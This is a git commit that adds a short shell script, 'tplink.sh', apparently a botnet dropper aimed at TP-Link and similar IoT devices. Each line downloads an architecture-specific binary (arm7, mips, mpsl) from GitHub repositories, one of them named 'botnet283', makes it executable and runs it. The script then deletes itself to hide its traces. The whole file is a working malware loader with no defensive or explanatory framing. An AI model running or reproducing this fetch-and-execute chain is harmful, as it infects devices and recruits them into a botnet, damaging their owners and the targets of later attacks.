22fca0e372f9de49325cb01c373678f2cc7ce746
Matrix2077v2 <mariataylormzi24@gmail.com>
2025-06-14 04:18:15 +0500

    Create tplink.sh

---
+++ tplink.sh
@@ -0,0 +1,5 @@
+rm -rf arm7; wget https://raw.githubusercontent.com/ondirisuliuly/botnet283/refs/heads/main/arm7; chmod 777 arm7;./arm7 tplink.arm7;
+rm -rf mips; wget https://raw.githubusercontent.com/ondirisuliuly/botnet283/refs/heads/main/mips; chmod 777 mips; ./mips tplink.mips;
+rm -rf mpsl; wget https://raw.githubusercontent.com/Matrix2077v2/test/refs/heads/main/mpsl; chmod 777 mpsl; ./mpsl tplink.mpsl;
+
+rm $0
